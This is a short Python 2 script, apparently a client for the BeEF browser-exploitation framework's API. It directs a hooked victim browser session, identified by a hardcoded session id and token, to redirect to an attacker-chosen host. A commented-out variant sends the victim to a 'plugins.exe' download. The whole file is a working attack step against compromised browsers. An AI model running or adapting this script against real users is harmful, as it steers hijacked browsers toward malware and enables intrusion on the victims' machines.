#!/usr/bin/env pthon
#--*--coding=utf-8--*--
# ** Author: ssooking

import json
import urllib2


def redirectBrowser(host, sessionId, authkey):
	#payload = {"redirect_url":"http://192.168.1.133:8000/plugins.exe"}
	payload = {"redirect_url":"http://192.168.20.115:8000/"}
	apiurl = host + "api/modules/" + sessionId + "/42?token=" + authkey
	jdata = json.dumps(payload)             # 对数据进行JSON格式化编码
	req = urllib2.Request(apiurl, jdata)      # 生成页面请求的完整数据
	req.add_header("Content-Type", "application/json; charset=UTF-8")
	response = urllib2.urlopen(req)           # 发送页面请
	resdata = response.read()                 # 获取服务器返回的页面信息，数据类型为str
	jsondata =  json.loads(resdata)	      	  # 把数据解析成python对象，此时返回dict数据	  
	print jsondata
	return jsondata

if __name__ == '__main__':
	host = "http://192.168.20.115:3000/"
	sessionId = "hydzVxzV0tmky5lvx6zaJbbCjbAgYp2StF8mNFpTj5uj31zhpjb0qau3ZfD2TSERy58Yns8RECLth4yS"
	key = "51e936d1f5d9c04d49ff100ae04a5f9ffbe97106"
	redirectBrowser(host,sessionId,key)